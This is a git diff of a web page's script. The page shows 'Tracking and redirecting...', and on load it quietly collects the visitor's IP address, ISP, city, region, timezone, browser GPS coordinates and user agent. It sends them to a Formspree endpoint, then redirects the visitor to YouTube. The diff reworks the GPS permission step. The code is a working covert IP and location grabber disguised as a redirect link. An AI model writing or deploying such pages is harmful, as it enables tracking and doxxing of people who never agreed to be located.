@@ -26,48 +26,56 @@
     <p>Tracking and redirecting...</p>
   </div>
 
+
 <script>
+async function getGeoCoords() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve({ latitude: "Not supported", longitude: "Not supported" });
+    } else {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          resolve({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          });
+        },
+        error => {
+          resolve({ latitude: "Permission denied", longitude: "Permission denied" });
+        },
+        { timeout: 10000 }
+      );
+    }
+  });
+}
+
 async function getVisitorData() {
   try {
-    // IP from ipify
+    // Step 1: Get IP
     const ipRes = await fetch('https://api64.ipify.org?format=json');
     const ipJson = await ipRes.json();
     const ip = ipJson.ip;
 
-    // Location from ipwhois
+    // Step 2: Get IP-based location
     const locRes = await fetch(`https://ipwhois.app/json/${ip}`);
     const locData = await locRes.json();
 
-    // GPS from browser
-    let latitude = 'Not allowed';
-    let longitude = 'Not allowed';
+    // Step 3: Ask browser GPS permission
+    const gps = await getGeoCoords();
 
-    if (navigator.geolocation) {
-      try {
-        const geo = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
-        });
-        latitude = geo.coords.latitude;
-        longitude = geo.coords.longitude;
-      } catch (err) {
-        // permission denied or error
-      }
-    }
-
-    // Prepare data
+    // Step 4: Send to Formspree
     const data = {
       ip: ip,
-      isp: locData.org || 'N/A',
       country: locData.country || 'N/A',
       city: locData.city || 'N/A',
       region: locData.region || 'N/A',
+      isp: locData.org || 'N/A',
       timezone: locData.timezone || 'N/A',
-      latitude: latitude,
-      longitude: longitude,
+      latitude: gps.latitude,
+      longitude: gps.longitude,
       user_agent: navigator.userAgent
     };
 
-    // Send to Formspree
     await fetch("https://formspree.io/f/mldnbqvo", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -75,13 +83,18 @@ async function getVisitorData() {
     });
 
   } catch (e) {
-    console.error('Tracking error:', e);
+    console.error("Error:", e);
   } finally {
-    window.location.href = "https://youtube.com"; // এখানেই redirect হবে
+    window.location.href = "https://youtube.com";
   }
 }
 
-window.onload = getVisitorData;
+window.onload = () => {
+  getVisitorData();
+};
 </script>
-</body>
-</html>
+
+
+
+  
+  
